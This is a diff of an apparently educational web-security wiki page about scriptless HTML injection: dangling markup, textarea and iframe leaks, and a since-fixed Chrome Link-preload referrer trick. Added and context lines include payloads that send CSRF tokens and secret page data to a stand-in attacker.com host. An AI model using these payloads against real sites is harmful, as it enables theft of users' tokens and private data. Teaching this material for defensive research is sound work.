@@ -29,9 +29,18 @@ The idea of [Dangling Markup](https://lcamtuf.coredump.cx/postxss/) is to write 
 ```
 {% endcode %}
 
-This results in a request to the following URL, which the attacker can decode to get the value of the sensitive CSRF token:
+This results in an image request to the following URL, which the attacker can decode to get the value of the sensitive CSRF token:
 
 [https://attacker.com/?%3C/div%3E%3Cinput%20type=%22hidden%22%20name=%22csrf%22%20value=%221337%22%3E%3C/form%3E%3Cp%3EI](https://attacker.com/?%3C/div%3E%3Cinput%20type=%22hidden%22%20name=%22csrf%22%20value=%221337%22%3E%3C/form%3E%3Cp%3EI)
+
+You may also find a scenario where there is no double or single quote after the data you want to leak, but if the data you seek is close enough (eg. without   or `>` in between), you could leak it _without quotes at all_. Below is an example where sensitive data is appended to your input:
+
+{% code title="HTML Source" %}
+```html
+<img src=https://attacker.com?SECRET_DATA
+<p>Some more text</p>
+```
+{% endcode %}
 
 One annoying thing to work with is that Chromium denies any URLs (or `target` values) containing newlines. If the leaked content contains any newlines, as is pretty common for HTML, the attacker cannot receive a request. Minifiers will sometimes remove newlines as they are unnecessary, but more often than not, you will have to deal with this. Firefox still allows newlines in URLs, though, so you're not left without impact.
 
@@ -47,7 +56,7 @@ Another idea is to use `<textarea>`, as it will only be closed by the `</textare
 ```
 {% endcode %}
 
-While this works on Firefox too, unfortunately Chromium also has a protection against this. There needs to be a natural `</textarea>` somewhere after your injection point.
+While this too works on Firefox, Chromium has a protection against this. There needs to be a natural `</textarea>` somewhere after your injection point.
 
 <figure><img src="../../../.gitbook/assets/image (67).png" alt="" width="563"><figcaption><p>Chromium denying an implicitly closed <code>&#x3C;textarea></code></p></figcaption></figure>
 
@@ -60,7 +69,7 @@ Ideas taken from here:\
 
 One very creative idea to bypass this restriction without scripts is if `<iframe>` tags are allowed with a `src=data:`. If this is the case, you can start a document with a UTF-16 charset and start a URL from there. The content after it will still be included in the `src=`, but is decoded as UTF-16, creating random chinese characters. The URL will then contain these high unicode characters instead of newlines, so they are allowed.
 
-We'll use a leak method that automatically closes itself at the end of the document:
+We'll use a great leak method that **automatically closes itself at the end of the document**:
 
 {% code title="Encoded prefix" %}
 ```html
@@ -115,7 +124,7 @@ Although note that at this point, you are likely able to leak content through [c
 
 #### Iframe name attribute
 
-When you are able to create an iframe with a remote source, the `name=` attribute is leakable cross-origin by reading the `window.name` variable as the attacker. This may include newlines even on Chromium, because it is not a URL or target:
+When you are able to create an iframe with a remote source, the `name=` attribute is leakable cross-origin by reading the `window.name` variable as the attacker. This may include newlines, even on Chromium, because it is not a URL or target:
 
 {% code title="HTML Source" %}
 ```html
@@ -269,10 +278,19 @@ For more elements that request a certain URL and that you may control to send a 
 All known ways to send HTTP requests using markup
 {% endembed %}
 
-#### Link response header with preload
+When cross-site connections to your attacker's server aren't allowed by a CSP, for example, you may be able to use an `<iframe>` with a `srcdoc=` or `src=data:`. This allows you to provide an inline document that will handle the request, and can read `document.referrer`.
 
-This next trick feels like a bug in Chromium, but it's just an old feature that was never removed.\
-[@slonser 🐘](https://x.com/slonser_/status/1919439373986107814) shared that you can alter the referrer policy for a preload request that you give in a `Link:` response header to any subresource that goes to your server.
+<pre class="language-html" data-title="Examples" data-overflow="wrap"><code class="lang-html">&#x3C;!-- If you are able to inject this, you'll be same-origin with the parent anyway -->
+<strong>&#x3C;iframe srcdoc="&#x3C;script>alert(document.referrer)&#x3C;/script>" referrerpolicy="unsafe-url">&#x3C;/iframe>
+</strong>
+&#x3C;!-- Even though data: normally gets a 'null' origin, it can still read referrer -->
+<strong>&#x3C;iframe src="data:text/html,&#x3C;script>alert(document.referrer)&#x3C;/script>" referrerpolicy="unsafe-url">&#x3C;/iframe>
+</strong></code></pre>
+
+#### Link response header with preload (Chrome < 136)
+
+This next trick was a Chrome bug shared by [@slonser 🐘](https://x.com/slonser_/status/1919439373986107814) _fixed in version 136_.\
+The referrer policy for a preload request that you give in a `Link:` response header to any subresource that goes to your server, will be applied to the current documentt.
 
 What this means is that all you need is for the target to load an `<img>` that points to your server, and you can return the following response header:
 
@@ -281,6 +299,8 @@ Link: </leak>; rel=preload; as=image; referrerpolicy=unsafe-url
 ```
 
 <figure><img src="../../../.gitbook/assets/image (66).png" alt=""><figcaption><p>Exploit leaking referer from <a href="https://r.jtw.sh/">r.jtw.sh</a> image</p></figcaption></figure>
+
+Above you can see an image being loaded cross-origin that responds with the mentioned `Link:` header. In the `/leak` requests that the preload asks for, the unsafe `referrerpolicy=` will be applied!
 
 This works for **any subresource request** to an attacker's domain, including things like stylesheet `@import` or `@font-face` if the CSP blocks images.
 
@@ -347,8 +367,8 @@ If your injection is stored, it can be pretty convincing to suddenly be brought 
 
 It also allows you to trigger [`.postMessage()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) handlers for all kinds of exploitation. Read more details on the page below:
 
-{% content-ref url="../../../languages/javascript/postmessage-exploitation.md" %}
-[postmessage-exploitation.md](../../../languages/javascript/postmessage-exploitation.md)
+{% content-ref url="postmessage-exploitation.md" %}
+[postmessage-exploitation.md](postmessage-exploitation.md)
 {% endcontent-ref %}
 
 ### Forms
